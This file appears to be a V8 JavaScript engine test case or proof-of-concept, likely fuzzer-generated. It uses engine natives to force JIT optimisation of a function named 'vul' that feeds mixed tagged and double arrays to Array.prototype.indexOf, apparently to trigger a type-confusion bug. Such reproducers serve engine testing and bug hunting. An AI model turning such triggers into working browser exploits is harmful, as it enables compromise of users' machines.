[0.4749529852861153,677655.4449411354];
[3.0,-4.0,1000.0,-267220.324092943,4.0,-1.382522660715037e+308,1000000.0,NaN];
[1.0367764393020383e+308,960310.1898341109,313126.5411047973,54.70089317492102,0.0];
new Uint32Array(5);
new Int16Array(512);
new BigUint64Array(78);
function vul() {
    const arr = Array(1000);
    function inlined_func() {
        try {
            const err_obj = { e: p4nda, length: arr };
        } catch(e31) {
            function main() {
                function f0(a34, a35) {
                    var v4 = a35[0];
                    var v5 = a34[0];
                    Array.prototype.indexOf.call(a35);
                }
                const v44 = %PrepareFunctionForOptimization(f0);
                const v47 = new Array(1);
                var v0 = v47;
                v0[0] = "tagged";
                f0(v0, [1]);
                const v54 = new Array(1);
                var v1 = v54;
                v1[0] = 0.1;
                const v57 = %OptimizeFunctionOnNextCall(f0);
                f0(v1, v1);
            }
            main();
            main();
            return e31;
        }
    }
    for (let i62 = 0; i62 < 25; i62++) {
        inlined_func();
    }
    var res = inlined_func();
    const v71 = {};
    /p4nda/.test(v71);
    arr.shift();
    return res;
}
const v75 = %PrepareFunctionForOptimization(vul);
vul();
vul();
const v78 = %OptimizeFunctionOnNextCall(vul);
var res = vul();
gc();
gc();
